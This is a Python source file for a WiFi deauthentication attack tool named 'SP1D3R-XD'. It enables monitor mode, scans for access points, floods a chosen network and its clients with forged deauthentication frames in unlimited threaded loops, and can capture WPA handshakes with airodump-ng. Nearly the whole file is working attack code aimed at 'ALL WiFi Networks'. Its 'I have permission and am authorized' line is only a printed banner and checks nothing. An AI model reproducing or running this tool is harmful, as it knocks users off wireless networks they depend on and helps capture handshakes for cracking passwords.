#!/usr/bin/env python3
# 🕷️ SP1D3R-XD Deauthentication ATTACK TOOL v2.0 🕷️
# Author: SP1D3R-XD | Kali/Termux Compatible | All WiFi Networks

import os
import sys
import time
import threading
import argparse
import subprocess
from scapy.all import *
from colorama import init, Fore, Style
import requests
import json

init(autoreset=True)


class SP1D3RXD:
    def __init__(self):
        self.banner()
        self.found_aps = {}
        self.attack_running = False

    def banner(self):
        print(
            f"""
{Fore.RED}                    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
{Fore.RED}                   ▄▄│  {Fore.YELLOW}SP1D3R{Fore.RED}- {Fore.MAGENTA}XD{Fore.RED}  │▄▄
{Fore.RED}                  ▄▄  {Fore.YELLOW}DEAUTHENTICATION{Fore.RED}  ATTACK TOOL v2.0  ▄▄
{Fore.RED}                 ▄▄  {Fore.CYAN}🕷️  SPIDER WEB WIFI KILLER  🕷️  ▄▄
{Fore.RED}                ▄▄                                              ▄▄
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.WHITE}Author:    SP1D3R-XD  |  Kali Linux & Termux         {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}Targets:   ALL WiFi Networks (WPA/WPA2/WPA3/WEP)    {Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}Status:    {Fore.GREEN}I have permission and am authorized{Fore.WHITE} {Fore.CYAN}║
{Fore.CYAN}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.RED}                    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        """
        )

    def check_root(self):
        return os.geteuid() == 0

    def start_monitor(self, iface):
        """Auto-start monitor mode"""
        if "mon" not in iface:
            mon_iface = iface + "mon"
            subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL)
            print(f"{Fore.GREEN}[+] Monitor interface: {mon_iface}")
            return mon_iface
        return iface

    def get_interfaces(self):
        """List wireless interfaces"""
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split("\n"):
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces

    def scan_networks(self, iface, timeout=15):
        """Advanced AP scanning with clients"""
        print(f"{Fore.YELLOW}[*] Scanning {iface} for {timeout}s... Press Ctrl+C to stop early")
        self.found_aps = {}

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                ssid = pkt[Dot11Elt].info.decode(errors="ignore")
                if ssid and bssid not in self.found_aps:
                    self.found_aps[bssid] = ssid
                    # Fixed: Proper Scapy layer indexing syntax
                    channel = (
                        pkt[Dot11Elt][2].channel
                        if pkt.haslayer(Dot11Elt) and len(pkt[Dot11Elt]) > 2
                        else "?"
                    )
                    print(f"{Fore.GREEN}[+] {ssid} | {bssid} | CH:{channel}")

        try:
            sniff(iface=iface, prn=packet_handler, timeout=timeout)
        except KeyboardInterrupt:
            pass
        return self.found_aps

    def deauth_packet(self, bssid, client="ff:ff:ff:ff:ff:ff"):
        """Craft deauth packet"""
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        return pkt

    def deauth_flood(self, bssid, client, iface, packets=0, rate=0.05, direction="both"):
        """Multi-threaded deauth flood"""
        print(f"{Fore.RED}[🚀] Flooding {bssid} -> {client} | Rate: {rate}s | Packets: {packets or '∞'}")

        def send_loop():
            sent = 0
            while self.attack_running and (packets == 0 or sent < packets):
                if direction in ["ap", "both"]:
                    sendp(
                        self.deauth_packet(bssid, "ff:ff:ff:ff:ff:ff"),
                        iface=iface,
                        verbose=0,
                        inter=rate,
                    )
                if direction in ["client", "both"]:
                    sendp(
                        self.deauth_packet(bssid, client), iface=iface, verbose=0, inter=rate
                    )
                sent += 2 if direction == "both" else 1
                if sent % 200 == 0:
                    print(f"{Fore.CYAN}[*] Sent {sent} packets...")

        thread = threading.Thread(target=send_loop)
        thread.daemon = True
        return thread

    def capture_handshakes(self, bssid, channel, iface, output="handshake"):
        """Concurrent handshake capture"""
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output} {iface} &"
        subprocess.Popen(cmd, shell=True)
        print(f"{Fore.BLUE}[📡] Capturing handshakes → {output}-01.cap")

    def run_attack(
        self, iface, bssid=None, client=None, packets=0, rate=0.05, channel=None, capture=False
    ):
        iface = self.start_monitor(iface)

        if not bssid:
            aps = self.scan_networks(iface)
            if not aps:
                print(f"{Fore.RED}[-] No APs found!")
                return
            bssid = input(f"{Fore.YELLOW}[?] Enter BSSID: ").strip()
            if bssid not in aps:
                print(f"{Fore.RED}[-] BSSID not found!")
                return

        client = client or input(f"{Fore.YELLOW}[?] Client MAC (Enter=ALL): ").strip() or "ff:ff:ff:ff:ff:ff"
        direction = input(f"{Fore.YELLOW}[?] Direction (ap/client/both): ").lower() or "both"

        if capture:
            self.capture_handshakes(bssid, channel or "1", iface)

        self.attack_running = True
        threads = [
            self.deauth_flood(bssid, client, iface, packets, rate, direction),
            self.deauth_flood(bssid, "ff:ff:ff:ff:ff:ff", iface, packets, rate, direction),
        ]

        for t in threads:
            t.start()

        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n{Fore.GREEN}[+] Attack stopped gracefully!")

    def menu(self):
        if not self.check_root():
            print(f"{Fore.RED}[!] Run as sudo/root!")
            sys.exit(1)

        parser = argparse.ArgumentParser(add_help=False)
        parser.add_argument("-i", "--iface", help="Interface")
        parser.add_argument("-b", "--bssid", help="Target BSSID")
        parser.add_argument("-c", "--client", help="Client MAC")
        parser.add_argument("-p", "--packets", type=int, default=0)
        parser.add_argument("-r", "--rate", type=float, default=0.05)
        parser.add_argument("--channel", type=int)
        parser.add_argument("--capture", action="store_true")
        parser.add_argument("--scan", action="store_true")
        args, unknown = parser.parse_known_args()

        interfaces = self.get_interfaces()
        print(f"{Fore.CYAN}[+] Wireless Interfaces: {', '.join(interfaces)}")

        iface = args.iface or interfaces[0] if interfaces else None
        if not iface:
            print(f"{Fore.RED}[-] No wireless interface!")
            return

        if args.scan:
            self.scan_networks(iface)
            return

        self.run_attack(
            iface, args.bssid, args.client, args.packets, args.rate, args.channel, args.capture
        )


if __name__ == "__main__":
    SP1D3RXD().menu()
